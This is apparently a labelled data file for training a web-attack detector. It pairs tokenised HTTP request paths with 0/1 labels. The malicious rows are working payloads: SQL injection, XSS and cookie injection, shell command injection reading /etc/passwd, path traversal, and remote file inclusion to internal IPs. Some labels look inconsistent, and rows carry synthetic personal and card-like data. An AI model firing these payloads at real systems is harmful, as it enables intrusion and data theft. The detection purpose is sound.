request	label
"/ string / strings / parameters = -5863 ""  ""  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  ""  "" gkvy ""  ""  =  ""  "" gkvy "	1
/ javascript / ssl . sql 	0
/ volpano / 	0
"/ string / strings / parameters = 1 ""  ""  )  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  ""  "" pdsy ""  ""  like  ""  "" pdsy "	1
"/ string / strings / parameters = < root /  >  /  /  [  ""  '  `  --  >  ]  ]  >  ]  <  / div > "	1
/ string / modo = registro & login = erh-huan4 & password = 0u3it8 & nombre = basiana & apellidos = castany + bigorra & email = balsamo @ chicashumedas . aw & dni = 81192846v & direccion = urbanizacion + santo + domingo + de + la + calzada + 113 + 6h & ciudada = alberguera + de + argan ,  + la & cp = 22760 & provincia = segovia & ntc = 0768342745697395 & b1 = registrar 	1
"/ string / strings / parameters = ""  + onkeypress =  "" prompt ( 23 )  ""  + "	1
/ version_4 / 	0
"/ string / strings / parameters = -9507 %  ""  ""  union all select 3342 , 3342 , 3342 , 3342 , 3342 # "	1
/ viewnewspapers . asp ? newspaperid = 123456 ' 	1
/ string / strings / parameters = ; echo $ ifsgpdocc $  (  ( 56 + 25 )  )  $  ( echo $ ifsgpdocc ) gpdocc \ 	1
/ javascript / item . nsf 	0
/ rtemagicc_euro / 	0
/ manatkeyboard / 	0
/ scripts / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login 	1
/ string / strings / parameters = < script test > alert ( 1 )  <  / script testtest > 	1
/ qinputmethodevent / 	0
/ getting-wine / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo kjbkaz )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1 	1
/ string / strings / parameters = herminda 	0
/ phpmyadmin / index . php ? action = view & filename =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ chu chu rocket - adgloride / 	0
/ javascript / cocoon . bat 	0
"/ lmw4r201 . do ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
/ 10133542 / 	0
"/ oie504mr . fts ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ string / strings / parameters = | echo $ ifsjjvjhf $  (  ( 77 + 32 )  )  $  ( echo $ ifsjjvjhf ) jjvjhf \ 	1
/ string / strings / parameters = reco . cida 	0
"/ fc9t54l7 . cgi ?  < script > document . cookie =  "" testggad = 2000 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- 	1
/ index . php ? src = 1 & _common = 1 & time = 1332010418 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / str =  $  ( echo bthzml )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ javascript / group . rar 	0
/ string / strings / parameters = 1 '  +  ( select gblp where 6768 = 6768 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
"/ string / strings / parameters = < object type =  "" text / x-scriptlet ""  data =  ""  %  ( scriptlet ) s ""  >  <  / object > "	1
/ n1afe1y6 . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ main . php ? stuff =  "" ver & rem \ x0b "	1
/ phpmyadmin / upgrade / index . php ? steporder [  ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ whyleasing / 	0
/ tabothersites180x22 / 	0
/ needleworkers / 	0
/ script / init / createallimagecache . php ? path_to_code = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ string / strings / parameters = holbrook 	0
"/ string / strings / parameters = '  | echo rmtaev $  (  ( 79 + 76 )  )  $  ( echo rmtaev ) rmtaev "" "	1
/ string / strings / parameters = < a href = javascript : alert ( 1 )  > click 	1
/ string / strings / parameters = declare  @ s varchar ( 200 )  select  @ s  =  0x77616974  .  .  . 	1
"/ v3axg1p8 . nsf ?  < script > document . cookie =  "" testxagh = 6987 ;  ""  <  / script > "	1
/ string / strings / parameters = calle fray luis sotelo ,  115 7-b 	0
/ networker-im / 	0
/ string / strings / parameters = '   str =  $  ( echo rqfvas )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
"/ en-us / odzk29aa . html ?  < meta http-equiv = set-cookie content =  "" testtfvh = 2141 ""  > "	1
/ 000067601 / 	0
/ string / strings / parameters = 1 '   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ' aicu '  =  ' aicu 	1
/ winnersawards / 	0
/ f260602a / 	0
/ infectionurl-thumb / 	0
/ dda2qr7j . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = alkin @ lesionesmusculares . pf 	0
/ y8pmygrp . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 050808 / 	0
/ string / modo = registro & login = bylina & password = 6o7zo6a & nombre = nedra & apellidos = sanchon + vilavend & email = saunders @ titulosoficiales . web & dni = 69441548v & direccion = marcelino + suarez + 39 ,  +  & ciudad = campello ,  + el & cp = 34475 & provincia = lava & ntc = 7173154653829351 & b1 = registrar 	0
/ string / strings / parameters = plang_schallert @ white-pearl-resort . kp 	0
/ javascript / 42 . war 	0
/ string / strings / parameters = duende ,  13 	0
/ string / strings / parameters = '  ;  str =  $  ( echo tbxnew )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
"/ oie504mr . aspx ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ scripts / ncbook / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10 	1
/ arcadetop / 	0
/ drhcprxk . cgi + 	0
/ string / strings / parameters = logroo 	0
/ advertising_good / 	0
"/ 0qhcnefz . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 5h5c8 	0
"/ string / strings / parameters = < xss style =  ""  "" xss : expression ( alert (  ' xss '  )  )  ""  ""  > "	1
"/ string / id = 1 & nombre = queso + manchego ""  + and +  "" 1 ""  =  "" 1 & precio = 100 & cantidad = 56 & b1 = aadir + al + carrito "	1
/ string / modo = insertar & precio = 7334 & b1 = pasar + por + caja / 	1
/ string / modo = registro & login = cancela & password = es + teatita & nombre = ivana & apellidos = pampanas + soto & email = tomono @ esteticadayda . az & dni = 98585223r & direccion = nao + victoria ,  + 79 ,  + 12 ? h & ciudad = zarzuela & cp = 32633 & provincia = madrid & ntc = 3891386369836978 & b1 = registrar 	0
/ 20061115showcase_top / 	0
/ string / strings / parameters = frison @ barnizultravioleta . jm 	0
"/ en-us / odzk29aa . mscgi ?  < script > document . cookie =  "" testtfvh = 2141 ;  ""  <  / script > "	1
/ define-gum / 	0
/ string / strings / parameters = calle buenos aires 82 5-d 	0
/ metodi / 	0
/ string / strings / parameters = 1 '  )  )  )  ; select  ( case when  ( 4660 = 4660 )  then 4660 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual -- 	1
/ string / strings / parameters = 08968667r 	0
/ j4drbkil . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ ukxzxrv9 . asmx 	0
/ string / strings / parameters = 1 '  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  ' ahjo '  =  ' ahjo 	1
/ 50644042 / 	0
/ javascript / _common . vb 	0
/ premium-templates / 	0
/ tobogganing / 	0
/ string / strings / parameters = mostazal 	0
/ string / strings / parameters = 98058748l 	0
/ parttimejobsingeorgia / 	0
/ examples / jsp / sessions / search . php ? submit = true & search =  '  )  ; 	1
"/ string / strings / parameters = -1447 ""  ""  union all select 3013 , 3013 , 3013 , 3013 , 3013 , 3013 , 3013 -- "	1
"/ j4rdyhw8 . asp ?  < script > document . cookie =  "" testrluj = 1420 ;  ""  <  / script > "	1
/ string / strings / parameters = -8357 '  )  )  as henk where 8198 = 8198 or 2558 = 9103 # 	1
/ htmlcalendar / 	0
/ q74225782 	0
"/ lmw4r201 . cfm ?  < meta http-equiv = set-cookie content =  "" testwews = 8477 ""  > "	1
"/ zroo33l4 . php ?  < script > document . cookie =  "" testiklc = 904 ;  ""  <  / script > "	1
/ 20040507-9 / 	0
/ anger management / 	0
/ javascript / em . manifest 	0
"/ string / strings / parameters = < img src = x \ x13onerror =  "" javascript : alert ( 1 )  ""  > "	1
/ string / strings / parameters = jandtegui curell 	0
"/ en-us / w4996nr0 . php3 ?  < meta http-equiv = set-cookie content =  "" testttvs = 7163 ""  > "	1
"/ help . php ? q =  "" ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; "	1
/ string / modo = registro & login = jared & password = anunciador & nombre = gisela & apellidos = downs & email = azema . alvir @ telogis . gf & dni = 72932222g & direccion = c /  + madrid ,  + 53 + 5-f & ciudad = aldehuela + de + yeltes & cp = 09247 & provincia = guadalajara & ntc = 9385780627956523 & b1 = registrar 	0
/ string / strings / parameters = & echo fwautf $  (  ( 39 + 22 )  )  $  ( echo fwautf ) fwautf & 	1
/ 20040514 / 	0
/ string / strings / parameters = boggs @ cocteleria . dz 	0
/ javascript / preserve . gif 	0
/ nanopeg editor v2 / 	0
/ a22121-2004mar24 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; if ( 8727 = 4039 )  select 8727 else drop function giql -- "	1
/ phpmyadmin / shoutbox . php ? conf =  .  .  / 	1
/ 10007656 / 	0
/ cpu-bottom / 	0
/ 000086427 / 	0
/ 661056005 / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 19 & b1 = aadir + al + carrito 	0
/ logo_usagov / 	0
"/ string / strings / parameters = 1 ""  ""  )  as ivuv where 5691 = 5691 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
"/ main . php ? stuff =  ""  ; del \ x09q18442351 \ x09 # "	1
/ simplestart / 	0
/ string / modo = registro & login = committe & password = 94cl09at8va & nombre = ornella & apellidos = cusell + vinageras & email = hervert @ clinicadentalsansalvador . ch & dni = 37156228g & direccion = c /  + quilichao + 85 +  & ciudad = vallclara & cp = 03786 & provincia = cceres & ntc = 6966776615880147 & b1 = registrar 	0
/ string / strings / parameters = '  &  & echo nlwqzv $  (  ( 48 + 73 )  )  $  ( echo nlwqzv ) nlwqzv /  / 	1
/ javascript / hp . htm 	0
/ javascript / notifications . old 	0
"/ string / strings / parameters = "" text  <  / script >  < script > alert ( 1 )  <  / script >  "" "	1
/ 108445 / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 43 & b1 = aadir + al + carrito 	0
/ javascript / link . conf 	0
/ string / strings / parameters = lundigan @ 3horas . gob 	0
/ string / strings / parameters = < svg / onload = eval ( location . hash . slice ( 1 )  )  >  ?  # alert ( 1 ) 	1
/ javascript / 15 / 	0
/ 142241 / 	0
/ osiris / 	0
/ dracula / 	0
/ javascript / nc . so 	0
/ mid30318 / 	0
/ biblioteca / bib_pldetails . php ? classpath = xxpathxx 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo jhkwge )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ string / strings / parameters = ;  str =  $  ( echo kkiqnh )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ ofnc17112003235088d / 	0
/ atdnet / 	0
/ javascript / portal . exe 	1
/ 20040719-newsletter / 	0
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 4 & b1 = aadir + al + carrito 	0
/ juddrogers / 	0
/ 161368 / 	0
/ vr000007068 / 	0
/ mzywodq3 / 	0
"/ 6dlc2zm9 . jspa ?  < script > document . cookie =  "" testqpux = 4016 ;  ""  <  / script > "	1
/ 042865 / 	0
"/ top . php ? stuff =  ""  | ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; "	1
/ i could sing of your love forever / 	0
"/ string / strings / parameters = ""  & echo aibilk $  (  ( 43 + 3 )  )  $  ( echo aibilk ) aibilk ' "	1
/ scriptpath / index . php ? page =  @ rfiurl 	1
/ javascript / programming . inc 	0
/ cgi-win / pfdisplay . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ doug sahm / 	0
/ string / id = 2 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 88 & b1 = aadir + al + carrito 	1
/ top . php ? stuff =  '  \ x0duname  > q84295152  # 	1
/ string / strings / parameters = mango_rizzo1 @ premiostv . ky 	0
/ 0535422442242743 / 	0
/ clipsyndicate / 	0
/ string / modo = insertar & precio = 2461 & b1 = pasar + por + caja 	0
/ top . php ? stuff =  '  \ x0arm \ x09q46955555 \ x09 # 	1
/ scripts / mundimail / template / simpledefault / admin / _masterlayout . php ? top =  @ rfiurl 	1
/ arenarock / 	0
"/ string / strings / parameters = ""  |   [  7 -ne  $  ( echo mnlbvu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | "	1
/ anydvd v5 / 	0
/ string / strings / parameters = van_mete2 	0
/ chizeto / 	0
/ a5e63430221a663724980c30fd1f64f184b5f8c621dcc4782d08fae235a4ac314f708c4243c3f7ae43ad213453911b4f288c1f148cc14a38 / 	0
"/ main . php ? logout =  "" ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
"/ x2gyorli . aspx ?  < script > document . cookie =  "" testwhac = 3130 ;  ""  <  / script > "	1
/ plastering / 	0
/ string / modo = entrar & login = cushing & pwd = 614n3r9 & remember = on /  & b1 = entrar 	1
/ at2016997232 / 	0
/ paglia970831 / 	0
"/ 3m5knyc4 . jsp ?  < script > document . cookie =  "" testbgqj = 6434 ;  ""  <  / script > "	1
/ string / strings / parameters = '  ;  str =  $  ( echo psujgu )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ string / strings / parameters = 1 where 3735 = 3735 ; waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ pr28apr2003b / 	0
/ string / strings / parameters = -6036 )  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  ( 6723 = 6723 	1
/ string / modo = registro & login = pryor & password = se1i81me885 & nombre = roque & apellidos = pinela & email = serratosa @ yiutuve . pe & dni = 41779761p & direccion = pedro + carabia + 195 +  & ciudad = inistola & cp = 16154 & provincia = jan & ntc = 8651552740405089 & b1 = registrar 	0
/ string / strings / parameters = calle la revoltosa ,  55 ,  11c 	0
/ string / strings / parameters = 3218 	0
/ designyourown / 	0
/ wapchat / src / eng . adcreatesave . php ? sysfiledir = xxpathxx 	1
/ privatesector / 	0
/ javascript / storage . exe 	1
/ string / strings / parameters = 7012 	0
/ wheeloyum / 	0
/ topicyapcan / 	0
"/ en-us / fo564rei . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ cgi-bin / gbook / gbook . cgi ? _mailto = xx ; ls 	1
/ juryban / 	0
/ search . php ? inspath = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	0
"/ 0w155a7c . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ chat / users_popupl . php3 ? from = xxpathxx 	1
/ examples / jsp / colors / core / editor . php ? editor_insert_bottom =  / etc / passwd 	1
/ javascript / crossdomain . phtml 	0
/ ezinequeen / 	0
/ string / strings / parameters = vanera 	0
/ menlovesex / 	0
/ rw228598 / 	0
/ cerrar_msj / 	0
"/ igtf0zon . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ admin / news . admin . php ? path_to_script = http :  /  / 192 . 168 . 202 . 96 : 8080 / llumt7msyau5y ?  ?  & cmd = ls 	1
/ string / strings / parameters = carmia 	0
/ string / strings / parameters = 1 %  '  )  )  )  or sleep ( 5 )  and  (  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = 9521659963163883 	0
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1331922005 )  <  / script > "	1
/ string / modo = registro & login = marcellu & password = 0a8839o & nombre = roco + azul & apellidos = nogueras + ascanio & email = daneliuc7 @ hostprofessional . py & dni = 13484819b & direccion = paseo + alcalde + fernandez + de + troconiz + 150 ,  +  & ciudad = sangesa / zangoza & cp = 09572 & provincia = jan & ntca = 0952481340892860 & b1 = registrar 	1
/ ipac20 / 	0
/ 1320612382 / 	0
/ string / strings / parameters = 1 and make_set ( 9681 = 4703 , 4703 )  #  zbrf 	1
/ betablockmodules / networkmoderateusermodule / networkmoderateusermodule . php ? path_prefix = xxpathxx 	1
/ string / strings / parameters = 13270596x 	0
/ 1stblood / 	0
/ 128036 / 	0
/ string / strings / parameters = 38068 	0
/ string / strings / parameters = < a onmouseover = location =  '  \ x6a \ x61 \ x76 \ x61 \ x53 \ x43 \ x52 \ x49 \ x50 \ x54 \ x26 \ x63 \ x6f \ x6c \ x6f \ x6e \ x3 b \ x63 \ x6f \ x6e \ x66 \ x69 \ x72 \ x6d \ x26 \ x6c \ x70 \ x61 \ x72 \ x3b \ x64 \ x6f \ x63 \ x75 \ x6d \ x65 \ x6e \ x74 \ x2e \ x63 \ x 6f \ x6f \ x6b \ x69 \ x65 \ x26 \ x72 \ x70 \ x61 \ x72 \ x3b '  > click 	1
/ mimesweeper / 	0
/ news \ newsletter \ press2001 \ 042501 / 	0
/ string / strings / parameters = 1 '  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ string / strings / parameters = 48083550a 	0
/ trustbar / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bfqfhb )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ 20050929_125919 / 	0
/ string / strings / parameters = castejon quiroga 	0
/ string / strings / parameters = &  & echo heczhw $  (  ( 41 + 77 )  )  $  ( echo heczhw ) heczhw ' 	1
/ dynatracker_v151 / action . php ? base_path = xxpathxx 	1
/ javascript / migrated . log 	0
"/ zuihld5m . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = 1 ""  ""  )  )  as ltco where 3862 = 3862 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- "	1
/ javascript / css . o 	0
/ javascript / cnf . exe 	1
/ string / strings / parameters = '   str =  $  ( echo lmrvvk )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / strings / parameters = baretto0 @ drae2 . tk 	0
/ jotnav / 	0
/ 718242091 / 	0
/ string / strings / parameters = 1 %  '  )  )  and sleep ( 5 )  # 	1
/ string_instrument / 	0
/ string / strings / parameters = |  | echo mmjatu $  (  ( 39 + 34 )  )  $  ( echo mmjatu ) mmjatu \ 	1
/ transformation brief1 / 	0
